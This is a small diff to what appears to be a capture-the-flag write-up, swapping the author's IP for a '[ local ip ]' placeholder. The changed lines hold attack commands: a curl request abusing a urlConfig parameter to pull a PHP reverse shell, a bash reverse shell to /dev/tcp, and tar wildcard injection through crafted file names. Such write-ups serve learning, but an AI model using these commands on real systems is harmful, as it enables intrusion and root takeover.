@@ -138,7 +138,7 @@ I opened a Netcat session on that port
 I opened a python local server
 Lastly I typed
 ```
-curl http://[ip]/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php/?urlConfig\=http://10.8.100.122:80/php-reverse-shell.php
+curl http://[ip]/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php/?urlConfig\=http://[ local ip ]:80/php-reverse-shell.php
 ```
 
 So the netcat session got the connection.
@@ -168,7 +168,7 @@ I open a Netcat listener on 8585
 
 To exploit it I type
 `cd /var/www/html`
-`printf '#!/bin/bash\nbash -i >& /dev/tcp/10.8.100.122/8585 0>&1\n' > rev.sh``
+`printf '#!/bin/bash\nbash -i >& /dev/tcp/[ local ip ]/8585 0>&1\n' > rev.sh``
 `touch /var/www/html/--checkpoint-action=exec=bash\ rev.sh`
  `touch /var/www/html/--checkpoint=1`
 
